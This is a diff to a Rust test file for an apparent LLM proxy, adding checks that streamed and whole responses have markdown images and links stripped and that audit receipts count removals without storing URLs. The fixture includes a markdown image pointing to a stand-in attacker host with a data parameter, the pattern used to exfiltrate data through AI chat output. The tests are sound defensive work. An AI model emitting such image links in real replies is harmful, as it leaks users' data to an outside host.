@@ -11,7 +11,7 @@ use std::sync::atomic::{AtomicUsize, Ordering};
 use resguardo::server::{App, serve};
 use resguardo_core::{Config, VirtualKey};
 use resguardo_mock_upstream::MockUpstream;
-use serde_json::Value;
+use serde_json::{Value, json};
 use tokio::net::TcpListener;
 
 const OPENAI_KEY: &str = "sk-test-openai-not-real";
@@ -868,6 +868,18 @@ async fn a_whole_response_gets_the_same_controls() {
         reply.json()["choices"][0]["message"]["content"],
         "[image removed] a"
     );
+    // ADR 0017: the receipt counts what was removed, and never holds the URL.
+    wait_for_entries(&h, 2).await;
+    let all = entries(&h);
+    assert_eq!(
+        all[1]["response_controls"],
+        json!({"images_removed": 1, "links_removed": 1})
+    );
+    assert!(
+        !std::fs::read_to_string(&h.audit)
+            .unwrap()
+            .contains("attacker.test")
+    );
 }
 
 #[tokio::test]
@@ -990,6 +1002,34 @@ async fn a_stream_leaves_its_outcome_when_it_ends_or_is_cut() {
     let all = entries(&h);
     assert_eq!(all[1]["outcome"], "completed");
     assert_eq!(all[1]["stream"], true);
+    assert_eq!(all[1]["response_controls"], json!({}));
     assert_eq!(all[3]["outcome"], "aborted");
     assert_eq!(all[3]["response_findings"]["secret"], 1);
+    assert_eq!(all[3]["response_controls"], json!({}));
+}
+
+#[tokio::test]
+async fn a_stream_receipt_counts_what_the_controls_removed() {
+    let h = harness().await;
+    // The image is split across events; the second text block (Anthropic) is separate.
+    let content =
+        "MOCK_REPLY: Mira ![x](https://attacker.test/p?d=abc) y [a](https://attacker.test/) fin";
+    let reply = h.openai(&h.keys.bot, &stream_chat(content)).await;
+    assert_eq!(streamed_text(&reply.body), "Mira [image removed] y a fin");
+    let reply = h.anthropic(&h.keys.bot, &stream_messages(content)).await;
+    assert_eq!(streamed_text(&reply.body), "Mira [image removed] y a fin");
+    wait_for_entries(&h, 4).await;
+    assert_eq!(verify(&h), 4);
+    let all = entries(&h);
+    for outcome in [&all[1], &all[3]] {
+        assert_eq!(
+            outcome["response_controls"],
+            json!({"images_removed": 1, "links_removed": 1})
+        );
+    }
+    assert!(
+        !std::fs::read_to_string(&h.audit)
+            .unwrap()
+            .contains("attacker.test")
+    );
 }
